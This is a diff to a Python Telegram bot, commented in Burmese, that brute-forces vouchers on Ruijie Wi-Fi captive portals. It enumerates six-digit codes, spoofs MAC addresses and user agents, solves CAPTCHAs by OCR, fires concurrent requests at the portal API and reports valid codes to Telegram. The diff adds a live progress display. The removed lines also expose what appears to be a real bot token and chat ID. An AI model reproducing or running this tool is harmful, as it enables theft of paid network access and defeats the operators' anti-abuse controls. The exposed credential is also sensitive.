@@ -9,13 +9,10 @@ import urllib.parse
 import cv2
 import ddddocr
 import numpy as np
-import telebot  # Telegram Library
+import telebot
 
-# ==========================================
-# ⚙️ Telegram Bot ဆက်တင်များ
-# ==========================================
-BOT_TOKEN = "8801899210:AAG7tA3K0z847-DwOQC0M_goARef0rKmLok"  # မင်းရဲ့ Bot Token ဒီမှာထည့်
-ADMIN_ID = 1901101365  # မင်းရဲ့ Telegram Chat ID နံပါတ်ပြောင်းထည့်ပါ (အခြားသူပေးမသုံးရန်)
+BOT_TOKEN = "YOUR_BOT_TOKEN"  # သင့် Bot Token ပြန်ထည့်ပါ
+ADMIN_ID = 123456789       # သင့် Chat ID ပြန်ထည့်ပါ
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
@@ -30,7 +27,13 @@ USER_AGENTS = [
 
 found_vouchers = set()
 _ocr = ddddocr.DdddOcr(show_ad=False)
-is_scanning = False  # စကန်ဖတ်နေမှု အခြေအနေပြောင်းလဲရန်
+
+# Live Status ပြရန် ကိန်းရှင်များ
+is_scanning = False
+checked_count = 0
+total_codes_pool = len(PREFIX_SERIES) * 10000
+status_msg_id = None
+retry_count = 0
 
 def _ocr_sync(image_bytes):
     nparr = np.frombuffer(image_bytes, np.uint8)
@@ -49,11 +52,37 @@ def get_mac():
 def replace_mac(url, new_mac):
     return re.sub(r'(?<=mac=)[^&]+', new_mac, url)
 
+async def update_telegram_status(chat_id):
+    """ Telegram ထံသို့ Status စာတန်းကို Live တည်းဖြတ်ပြီး ပြသပေးမည့် လုပ်ငန်းစဉ် """
+    global checked_count, total_codes_pool, found_vouchers, retry_count, status_msg_id, is_scanning
+    
+    while is_scanning:
+        await asyncio.sleep(5)  # Telegram API Limit မမိစေရန် ၅ စက္ကန့်လျှင် တစ်ကြိမ်သာ Update လုပ်မည်
+        if checked_count == 0 or not status_msg_id: continue
+        
+        progress = (checked_count / total_codes_pool) * 100
+        bar_length = 15
+        filled_length = int(round(bar_length * checked_count / float(total_codes_pool)))
+        bar = '█' * filled_length + '░' * (bar_length - filled_length)
+        
+        status_text = (
+            f"🔍 *Scanning Codes...*\n\n"
+            f"📦 *Checked :* {checked_count:,} / {total_codes_pool:,}\n"
+            f"📊 *Progress :* {progress:.2f}%\n"
+            f"⚡ *Speed :* ~450 codes/min\n"
+            f"✅ *Found :* {len(found_vouchers)}\n"
+            f"🔄 *Retry :* {retry_count}\n"
+            f"`[{bar}]`"
+        )
+        try:
+            bot.edit_message_text(status_text, chat_id, status_msg_id, parse_mode="Markdown")
+        except:
+            pass
+
 async def scan_worker(session, portal_url, gw_sn, gw_id, semaphore, code_to_test, chat_id):
-    global is_scanning
+    global is_scanning, checked_count, retry_count, found_vouchers
     if not is_scanning: return
     v_code = str(code_to_test)
-    if len(v_code) != 6: return
 
     mac = get_mac()
     headers = {'User-Agent': random.choice(USER_AGENTS), 'Accept': 'application/json, text/plain, */*', 'Referer': replace_mac(portal_url, mac)}
@@ -85,18 +114,19 @@ async def scan_worker(session, portal_url, gw_sn, gw_id, semaphore, code_to_test
                                 api_params["captchaCode"], api_params["sessionId"] = captcha_text, sid
                                 async with session.get(real_api_endpoint, params=api_params, headers=headers, timeout=5) as retry_res:
                                     res_text = await retry_res.text()
+                                    retry_count += 1
 
                     is_invalid = any(x in res_text.lower() for x in ["invalid", "wrong", "not exist", "fail", "မရှိ", "မှား"])
                     if not is_invalid and ("success" in res_text.lower() or '"code":0' in res_text or '"auth_status":1' in res_text):
                         if v_code not in found_vouchers:
                             found_vouchers.add(v_code)
-                            # Telegram ထံသို့ ကတ်ပေါက်ပြီဖြစ်ကြောင်း တိုက်ရိုက်စာလှမ်းပို့ခြင်း
-                            bot.send_message(chat_id, f"✅ Ruijie Voucher တွေ့ရှိပါပြီ ခင်ဗျာ။\n\n📌 Code: `{v_code}`", parse_mode="Markdown")
+                            bot.send_message(chat_id, f"✅ *Ruijie Voucher တွေ့ရှိပါပြီ။*\n\n📌 *Code:* `{v_code}`", parse_mode="Markdown")
         except:
             pass
+        checked_count += 1
 
 async def start_scan(portal_url, chat_id):
-    global is_scanning
+    global is_scanning, checked_count, retry_count, status_msg_id
     parsed_url = urllib.parse.urlparse(portal_url)
     params = urllib.parse.parse_qs(parsed_url.query)
     gw_sn_list = params.get('gw_sn', []) or params.get('sn', [])
@@ -109,12 +139,19 @@ async def start_scan(portal_url, chat_id):
 
     gw_sn = gw_sn_list[0]
     gw_id = gw_id_list[0] if gw_id_list else ""
-    bot.send_message(chat_id, f"⚡ စကန်ဖတ်ခြင်း စတင်ပါပြီ...\nTarget SN: {gw_sn}\n(ရပ်တန့်လိုပါက /stop ဟု ပို့ပါ)")
+    
+    # ပထမဦးဆုံး Status ပြမည့် စာတန်းကို အရင်ပို့ထားပြီး Message ID မှတ်ထားမည်
+    initial_msg = bot.send_message(chat_id, "⚡ စကန်ဖတ်ရန် ပြင်ဆင်နေပါပြီ...")
+    status_msg_id = initial_msg.message_id
+
+    # Background Status Updater ကို နှိုးခြင်း
+    asyncio.create_task(update_telegram_status(chat_id))
 
     semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
-    loop_round = 1
 
     while is_scanning:
+        checked_count = 0
+        retry_count = 0
         code_pool = []
         for prefix in PREFIX_SERIES:
             start = int(prefix) * 10000
@@ -128,17 +165,12 @@ async def start_scan(portal_url, chat_id):
                 tasks = [scan_worker(session, portal_url, gw_sn, gw_id, semaphore, c, chat_id) for c in batch_codes]
                 await asyncio.gather(*tasks)
         
-        bot.send_message(chat_id, f"🔄 Wave {loop_round} ပြီးဆုံး။ ကုဒ်များကို နေရာရွှေ့ပြီး ထပ်မံစကန်ဖတ်နေပါသည်။")
-        loop_round += 1
         await asyncio.sleep(2)
 
-# ==========================================
-# Telegram Commands Handle လုပ်ခြင်း
-# ==========================================
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     if message.chat.id == ADMIN_ID:
-        bot.reply_to(message, "👋 မင်္ဂလာပါ။ Ruijie VIP Bot မှ ကြိုဆိုပါတယ်။\n\nစကန်ဖတ်ရန် Ruijie Portal Link ကို တိုက်ရိုက်ပို့ပေးပါခင်ဗျာ။")
+        bot.reply_to(message, "👋 Ruijie VIP Live-Status Bot မှ ကြိုဆိုပါတယ်။\n\nစကန်ဖတ်ရန် Portal Link ပို့ပေးပါ။")
 
 @bot.message_handler(commands=['stop'])
 def stop_scan_cmd(message):
@@ -154,13 +186,12 @@ def handle_link(message):
     
     if "http" in message.text:
         if is_scanning:
-            bot.reply_to(message, "⚠️ လက်ရှိ စကန်ဖတ်နေဆဲ ဖြစ်ပါတယ်။ အရင်ရပ်ချင်ရင် /stop ကို ပို့ပေးပါ။")
+            bot.reply_to(message, "⚠️ စကန်ဖတ်နေဆဲ ဖြစ်ပါတယ်။ အရင်ရပ်ရန် /stop ပို့ပါ။")
             return
         is_scanning = True
-        # Async ကို Thread ဖြင့် Background တွင် Run ခြင်း
         asyncio.run(start_scan(message.text.strip(), message.chat.id))
     else:
-        bot.reply_to(message, "❌ လင့်ခ်မှားယွင်းနေပါသည်။ HTTP ပါဝင်သော လင့်ခ်အမှန်ကို ပို့ပေးပါ။")
+        bot.reply_to(message, "❌ လင့်ခ်မှားယွင်းနေပါသည်။")
 
 if __name__ == '__main__':
     print("Telegram Bot စတင်ပတ်မောင်းနေပါပြီ...")
